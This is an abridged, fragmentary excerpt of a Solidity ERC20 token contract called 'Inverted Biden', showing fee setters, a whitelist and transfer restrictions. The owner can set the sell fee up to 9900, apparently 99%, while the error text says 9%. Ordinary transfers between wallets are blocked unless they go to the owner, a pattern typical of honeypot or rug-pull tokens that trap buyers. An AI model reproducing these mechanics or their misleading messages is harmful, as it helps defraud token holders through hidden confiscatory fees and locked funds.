...
contract BIDEN is ERC20, Ownable {
    ...
    */
    function userByIdInWhitelist(
        ...
        require(userId < _whitelist.length(), "BIDEN: Invalid user id");
    ...
    */
    ...
    ) ERC20("Inverted Biden", "BIDEN") {
        require(
            purchaseLiquidityPeriodLock_ > 0,
            "BIDEN: Purchase liquidity lockout period eq 0"
        );
        require(
            purchaseWhitelistPeriodLock_ > 0,
            "BIDEN: Purchase whitelist lockout period eq 0"
        );
        require(sellFee_ <= 9900, "BIDEN: Sell fee must be lt 9%");
        require(buyFee_ <= 500, "BIDEN: Buy fee must be lt 5%");
        require(
            marketingWallet_ != address(0),
            "BIDEN: Marketing wallet must not be zero"
        );
        require(
            uniswapRouter_ != address(0),
            "BIDEN: Uniswap router must not be zero"
        );
    ...
    */
    function setSellFee(uint256 newSellFee) external onlyOwner returns (bool) {
        require(newSellFee <= 9900, "BIDEN: Sell fee must be lt 9%");
        _sellFee = newSellFee;
    ...
    */
    function setBuyFee(uint256 newBuyFee) external onlyOwner returns (bool) {
        require(newBuyFee <= 500, "BIDEN: Sell fee must be lt 5%");
        _buyFee = newBuyFee;
    ...
    */
    function setWhitelistStatus(
        ...
        require(wallet != address(0), "BIDEN: wallet must not be zero");
    ...
    function _transfer(
        ...
        require(_from != address(0), "BIDEN: Transfer from address zero");
        require(_to != address(0), "BIDEN: Transfer to address zero");
        require(_amount > 0, "BIDEN: Transfer amount must be greater than zero");
        if (_from != pairAddress && _to != pairAddress) {
            ...
            require(_to == owner(), "BIDEN: Wallet should be owner");
            super._transfer(_from, _to, _amount);
        } else if (
            block.timestamp < _purchaseLiquidityPeriodLockEnd &&
            _to == pairAddress
        ) {
            require(_from == owner(), "BIDEN: Wallet should be owner");
            super._transfer(_from, _to, _amount);
        } else if (
            ...
            require(
                ...
                "BIDEN: Wallet should be in whitelist"
            );
